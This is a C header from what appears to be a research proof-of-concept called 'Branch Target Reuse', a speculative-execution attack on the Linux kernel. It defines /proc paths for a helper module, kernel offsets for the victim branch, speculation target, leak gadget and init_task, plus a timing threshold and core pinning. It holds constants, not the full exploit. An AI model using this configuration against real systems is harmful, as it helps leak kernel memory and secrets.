/*
 * Branch Target Reuse (BTR)
 * April 30th 2026
 */

#ifndef _TARGETS_H_
#define _TARGETS_H_

#define THR 80

#define PATH_PHYS_MAP "/proc/btr_help/phys_map_start"
#define PATH_MOCK_GADGET "/proc/btr_help/mock_gadget_address"
#define PATH_MOCK_GADGET_CB "/proc/btr_help/mock_gadget_address_cb"
#define PATH_LAST_MAPPED_MODULE "/proc/btr_help/last_mapped_module_region"

#define PATH_GET_AND_SET_FILTER_STRUCT "/proc/btr_help/get_and_set_filter_struct"
#define PATH_EVICT_FILTER_STRUCT "/proc/btr_help/evict_filter_struct"

#define PATH_GET_AND_SET_PROG_STRUCT "/proc/btr_help/get_and_set_prog_struct"
#define PATH_EVICT_PROG_STRUCT "/proc/btr_help/evict_prog_struct"
#define PATH_TIME_PROG_STRUCT "/proc/btr_help/time_prog_struct"

#define PATH_GET_AND_SET_FILTER_ENTRY_POINT "/proc/btr_help/get_and_set_filter_entry_point"
#define PATH_READ_BYTES_OLD_ENTRY_POINT "/proc/btr_help/read_bytes_old_entry_point"


#define SECRET_ADDRESS_OFFSET_DEFAULT 0x2c
#define SECRET_ADDRESS_OFFSET_CONSTANT_BLIND 0x40

#define BASE_ADDRESS_OFFSET 0x0
                                                          // If KASLR disabled:
#define VICTIM_BRANCH_PC_OFFSET 0x6df09b                  // 0xffffffff816df09b
#define SPECULATION_TARGET_PC_OFFSET 0x6df125             // 0xffffffff816df125
#define LEAK_GADGET_PC_OFFSET 0x2acd97

#define INIT_TASK_OFFSET  0x2610f00                       // 0xffffffff83610f00

#ifdef INTEL_13_GEN
#define LEAK_CORE 0
#define IDLE_CORE 0
#define CONTROLLER_CORE 0

#else
#define LEAK_CORE 2
#define IDLE_CORE 4
#define CONTROLLER_CORE 6
#endif

#endif //_TARGETS_H_
